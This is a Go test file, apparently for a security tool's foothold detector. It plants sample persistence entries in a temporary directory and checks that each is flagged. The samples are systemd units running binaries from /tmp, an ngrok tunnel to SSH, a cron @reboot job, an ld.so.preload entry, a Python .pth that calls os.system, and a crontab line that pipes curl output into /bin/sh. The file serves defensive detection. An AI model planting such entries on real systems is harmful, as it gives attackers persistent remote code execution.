package rasource

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Artifex-Technologies/Heimdall/internal/remoteaccess"
)

// plantFootholds writes a made-up root for TestFootholds: one foothold of each kind planted beside ordinary files of the
// same places. The Rust port reads the same tree (rust/heimdall/src/sources/footholds.rs, each_kind_planted_gives_one).
func plantFootholds(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	write := func(rel, text string) {
		p := filepath.Join(root, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(text), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	// ordinary: a package's unit, an autostart entry, a cron job, setuptools' .pth
	write("etc/systemd/system/backup.service", "[Service]\nExecStart=/usr/bin/restic backup /home\n")
	write("etc/xdg/autostart/panel.desktop", "[Desktop Entry]\nExec=/usr/bin/yggdrasil-panel\n")
	write("etc/cron.d/logrotate", "SHELL=/bin/sh\n0 3 * * * root /usr/bin/logrotate /etc/logrotate.conf\n")
	write("usr/lib/python3.14/site-packages/distutils-precedence.pth", "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'\n")
	// planted
	write("etc/systemd/system/update-helper.service", "[Service]\nExecStartPre=-/bin/true\nExecStart=/bin/sh -c \"/tmp/.x/upd --quiet\"\n")
	write("etc/systemd/system/getty@.service.d/override.conf", "[Service]\nExecStart=\nExecStart=/usr/bin/ngrok tcp 22\n")
	write("etc/systemd/user/sync.service", "[Service]\nExecStart=/home/u/.cache/sync/agent\n")
	write("etc/xdg/autostart/helper.desktop", "[Desktop Entry]\nExec=env A=1 /dev/shm/helper\n")
	write("etc/cron.d/clean", "@reboot root /var/tmp/clean.sh\n# 1 1 * * * root /tmp/commented\n")
	write("etc/crontab", "*/5 * * * * root curl -s http://x | /bin/sh\n")
	write("etc/ld.so.preload", "/usr/lib/libcheck.so\n")
	write("usr/lib/python3.14/site-packages/zz.pth", "import os; os.system('/run/user/0/p')\n")
	return root
}

// TestFootholds (HEI-11): each kind planted in a made-up root gives one event naming the file, the path and why; the
// ordinary files give none; an unchanged file is not read again, and a changed one is.
func TestFootholds(t *testing.T) {
	root := plantFootholds(t)
	w := footholdWatch{Root: root}
	var got []string
	for _, e := range w.poll(remoteaccess.Builtin()) {
		got = append(got, e.Fields["place"]+" "+e.Fields["why"]+" "+e.Fields["provider"]+" | "+e.Text)
	}
	want := []string{
		"cron temporary  | /etc/cron.d/clean (a cron job) points at /var/tmp/clean.sh",
		"preload preload  | /etc/ld.so.preload makes every program load /usr/lib/libcheck.so",
		"service tool ngrok | /etc/systemd/system/getty@.service.d/override.conf (a service) points at /usr/bin/ngrok (ngrok)",
		"service temporary  | /etc/systemd/system/update-helper.service (a service) points at /tmp/.x/upd",
		"service hidden  | /etc/systemd/user/sync.service (a service) points at /home/u/.cache/sync/agent",
		"autostart temporary  | /etc/xdg/autostart/helper.desktop (an autostart entry) points at /dev/shm/helper",
		"pth temporary  | /usr/lib/python3.14/site-packages/zz.pth (a Python startup file) points at /run/user/0/p",
	}
	if strings.Join(got, "\n") != strings.Join(want, "\n") {
		t.Fatalf("got\n%s\nwant\n%s", strings.Join(got, "\n"), strings.Join(want, "\n"))
	}
	if again := w.poll(remoteaccess.Builtin()); len(again) != 0 {
		t.Errorf("unchanged files are not read again: %v", again)
	}
	// the unit cleaned up, then planted again (a different size): read again each time
	unit := filepath.Join(root, "etc/systemd/system/update-helper.service")
	if err := os.WriteFile(unit, []byte("[Service]\nExecStart=/usr/bin/true\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if e := w.poll(remoteaccess.Builtin()); len(e) != 0 {
		t.Errorf("cleaned: %v", e)
	}
	if err := os.WriteFile(unit, []byte("[Service]\nExecStart=/tmp/.x/upd --again\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if e := w.poll(remoteaccess.Builtin()); len(e) != 1 || e[0].Fields["target"] != "/tmp/.x/upd" {
		t.Errorf("planted again: %v", e)
	}
}
